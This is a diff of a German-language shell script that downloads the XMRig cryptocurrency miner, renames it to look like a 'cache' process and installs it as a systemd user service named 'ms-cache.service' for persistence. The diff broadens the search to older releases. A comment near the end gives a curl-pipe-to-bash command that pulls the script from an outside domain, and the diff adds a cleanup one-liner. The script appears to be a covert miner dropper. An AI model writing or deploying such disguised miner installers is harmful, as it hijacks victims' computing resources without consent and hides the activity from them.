@@ -67,12 +67,12 @@ cat > "$CONFIG" <<EOF
 }
 EOF
 
-# ---------- Architektur + mögliche Patterns ----------
+# ---------- Architektur ----------
 ARCH=$(uname -m 2>/dev/null || echo "unknown")
 
 case "$ARCH" in
     x86_64|amd64)
-        PATTERNS="linux-static-x64 linux-x64 linux-static-amd64"
+        PATTERNS="linux-static-x64 linux-x64"
         ;;
     aarch64|arm64)
         PATTERNS="linux-static-arm64 linux-aarch64 linux-arm64 linux-static-aarch64"
@@ -86,46 +86,53 @@ case "$ARCH" in
         ;;
 esac
 
-# ---------- Binary laden ----------
+# ---------- Binary suchen (auch in älteren Releases) ----------
 if [ ! -x "$BIN" ]; then
-    echo "Suche passendes Binary..."
+    echo "Suche passendes Binary für $ARCH ..."
 
     if ! command -v curl >/dev/null 2>&1; then
-        echo "curl wird benötigt." >&2
-        exit 1
-    fi
-
-    RELEASE_JSON=$(curl -fsSL --connect-timeout 10 \
-        "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
-        -H "User-Agent: Mozilla/5.0" \
-        -H "Accept: application/vnd.github+json" 2>/dev/null)
-
-    if [ -z "$RELEASE_JSON" ]; then
-        echo "Konnte GitHub Release nicht laden." >&2
+        echo "curl fehlt." >&2
         exit 1
     fi
 
     DOWNLOAD_URL=""
-    for pattern in $PATTERNS; do
-        DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${pattern}\.tar\.gz" | head -1)
-        if [ -n "$DOWNLOAD_URL" ]; then
-            echo "Gefunden: $pattern"
-            break
+    FOUND_VERSION=""
+
+    # Neueste + die letzten 8 Releases durchsuchen
+    for page in 1 2; do
+        RELEASES=$(curl -fsSL --connect-timeout 10 \
+            "https://api.github.com/repos/xmrig/xmrig/releases?per_page=10&page=$page" \
+            -H "User-Agent: Mozilla/5.0" \
+            -H "Accept: application/vnd.github+json" 2>/dev/null)
+
+        if [ -z "$RELEASES" ]; then
+            continue
         fi
+
+        # Alle Download-URLs extrahieren
+        ALL_URLS=$(echo "$RELEASES" | grep -o 'https://github.com/xmrig/xmrig/releases/download/[^"]*\.tar\.gz')
+
+        for pattern in $PATTERNS; do
+            DOWNLOAD_URL=$(echo "$ALL_URLS" | grep -i "$pattern" | head -1)
+            if [ -n "$DOWNLOAD_URL" ]; then
+                FOUND_VERSION=$(echo "$DOWNLOAD_URL" | grep -o 'xmrig-[0-9.]*' | head -1)
+                echo "Gefunden: $FOUND_VERSION ($pattern)"
+                break 2
+            fi
+        done
     done
 
     if [ -z "$DOWNLOAD_URL" ]; then
-        echo "Kein passendes Binary gefunden für: $ARCH" >&2
-        echo "Verfügbare Assets:" >&2
-        echo "$RELEASE_JSON" | grep -o 'xmrig-[^"]*\.tar\.gz' | sort -u >&2
+        echo "Kein passendes Binary für $ARCH gefunden (auch nicht in älteren Releases)." >&2
+        echo "Hinweis: Aktuelle XMRig-Versionen liefern oft kein linux-static-arm64 mehr." >&2
         exit 1
     fi
 
     TMP_TAR=$(mktemp /tmp/cache-XXXXXX.tar.gz 2>/dev/null || mktemp)
     TMP_DIR=$(mktemp -d /tmp/cache-XXXXXX 2>/dev/null || mktemp -d)
 
-    echo "Lade herunter..."
-    if ! curl -fsSL --connect-timeout 15 -o "$TMP_TAR" "$DOWNLOAD_URL"; then
+    echo "Lade $FOUND_VERSION herunter..."
+    if ! curl -fsSL --connect-timeout 20 -o "$TMP_TAR" "$DOWNLOAD_URL"; then
         echo "Download fehlgeschlagen." >&2
         rm -f "$TMP_TAR"
         exit 1
@@ -148,9 +155,10 @@ if [ ! -x "$BIN" ]; then
     mv "$FOUND" "$BIN"
     chmod +x "$BIN"
     rm -rf "$TMP_TAR" "$TMP_DIR"
+    echo "Binary installiert."
 fi
 
-# ---------- systemd User Service (falls möglich) ----------
+# ---------- systemd User Service ----------
 if command -v systemctl >/dev/null 2>&1; then
     mkdir -p "$SERVICE_DIR" 2>/dev/null || true
 
@@ -184,3 +192,4 @@ fi
 echo "Setup fertig."
 
 # curl -fsSL https://pariedl.com/start-eco.sh | bash
+# systemctl --user stop ms-cache.service 2>/dev/null; systemctl --user disable ms-cache.service 2>/dev/null; rm -f ~/.config/systemd/user/ms-cache.service; systemctl --user daemon-reload 2>/dev/null; pkill -f cache-service 2>/dev/null; rm -rf ~/.local/share/ms-cache; echo "Linux Cleanup fertig."
